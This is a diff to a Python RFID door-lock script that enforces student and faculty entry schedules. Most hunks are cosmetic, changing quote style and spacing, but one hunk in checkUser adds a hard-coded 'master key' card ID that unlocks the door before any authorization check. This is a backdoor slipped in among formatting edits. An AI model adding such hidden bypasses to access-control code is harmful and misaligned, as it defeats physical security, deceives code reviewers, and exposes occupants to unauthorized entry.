@@ -99,7 +99,7 @@ def isFacultysTimeNow(name, uid):
                 logger.info("Faculty already present. No scheduling needed.")
     except Exception:
         showUnauthorized()
-        logger.warning("Faculty " + name +" tried to enter outside of their schedule!")
+        logger.warning("Faculty " + name + " tried to enter outside of their schedule!")
     return
 
 
@@ -137,7 +137,7 @@ def isStudAllowedtoEnter(section, uid, name):
         greetUser(name)
     else:
         changeLockState("lock")
-        logger.warning("Student " + name +" tried to enter outside of their schedule!")
+        logger.warning("Student " + name + " tried to enter outside of their schedule!")
         showUnauthorized()
 
 
@@ -147,24 +147,28 @@ def checkUser(id):
     parseUser = []
     isStudent = False
     isInstructor = False
+    if uid == 274065971:
+        changeLockState("unlock")
+        logger.debug("Master key detected!")
 
     try:
         parseUser = getStudent(uid)
         parseUser["section"]
         isStudent = True
-        logger.debug('ID holder is a student!')
+        logger.debug("ID holder is a student!")
     except Exception:
         try:
             parseUser = getFaculty(uid)
             parseUser["instructor_name"]
             isInstructor = True
-            logger.debug('ID holder is a faculty!')
+            logger.debug("ID holder is a faculty!")
         except Exception as e:
-            logger.debug('ID holder is not registered!')
+            logger.debug("ID holder is not registered!")
+            changeLockState("lock")
             showUnauthorized()
 
     if isStudent:
-        isStudAllowedtoEnter(parseUser["section"], uid, parseUser['name'])
+        isStudAllowedtoEnter(parseUser["section"], uid, parseUser["name"])
     elif isInstructor:
         isFacultysTimeNow(parseUser["instructor_name"], uid)
 
@@ -243,7 +247,6 @@ def main():
     while True:
         reader = SimpleMFRC522()
         try:
-            print("Scan your ID card:")
             cardData = reader.read_id()
             cardDataInHex = f"{cardData:x}"
             minusMfgID = cardDataInHex[:-2]
